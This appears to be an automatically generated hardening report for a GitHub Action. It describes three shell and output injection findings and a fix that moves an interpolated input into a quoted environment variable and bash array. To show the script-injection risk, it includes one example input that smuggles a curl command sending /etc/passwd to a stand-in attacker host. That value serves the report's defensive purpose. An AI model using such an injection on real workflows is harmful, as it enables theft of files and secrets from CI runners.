<!-- markdownlint-disable -->

# Hardening Report: freckle--stack-action--generate-matrix/v5.7.16

> This file was generated automatically by the hardening agent.

**Policy SHA:** `d636be7e43ef829af6e853da6b3c7566db9f72fe`

**Test Policy SHA:** `843adf9e4b8f85d0c08b27b9d0b09dd094b54702`

**Harden Agent Version:** `2`

Action **freckle--stack-action--generate-matrix/v5.7.16** was hardened automatically. 3 finding(s) were identified and resolved across 1 iteration(s).

## Findings Fixed

### script-injection (severity: high)

Sub-rule (a): The `run:` block in the `generate` step directly interpolates the expression `${{ inputs.find-options }}` into the shell command string: `find ${{ inputs.find-options }} -printf "%f"\n`. This allows an attacker who controls the `find-options` input to inject arbitrary shell commands (e.g., by supplying a value like `-type f; curl -d @/etc/passwd https://evil.com #`). The expression must be moved to an `env:` variable and the variable must be double-quoted in the shell command.

Locations:

- `action.yml:22`

### github-env-injection (severity: high)

The `run:` block writes to `$GITHUB_OUTPUT` using a heredoc whose content is derived from `find ${{ inputs.find-options }} ...`. The value of `inputs.find-options` is attacker-controlled and is written to `$GITHUB_OUTPUT` without the required sanitization step (`printf '%s' ... | tr -d '\n\r'`). A malicious value containing newlines could inject additional key=value pairs into `$GITHUB_OUTPUT`, poisoning downstream step outputs.

Locations:

- `action.yml:20`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.find-options }}" appears directly in run: block of step "Generate"; move to env: map

Locations:

- `action.yml:26`

## Iteration Notes

### Iteration 1

**Fixes applied:** script-injection, github-env-injection, static-inline-injection

**Notes:**

Fixed all three findings in action.yml by moving `${{ inputs.find-options }}` from the run: block into an env: variable (`FIND_OPTIONS`). Since find-options is a list-style input (default: `-type f -maxdepth 1 -name 'stack*.yaml'`), it is tokenized into a bash array using the xargs NUL-delimited pattern with a guard for empty values. The array is then used as `find "${find_opts[@]}"` to preserve argument boundaries and quoting. This eliminates both the script-injection and github-env-injection vulnerabilities.

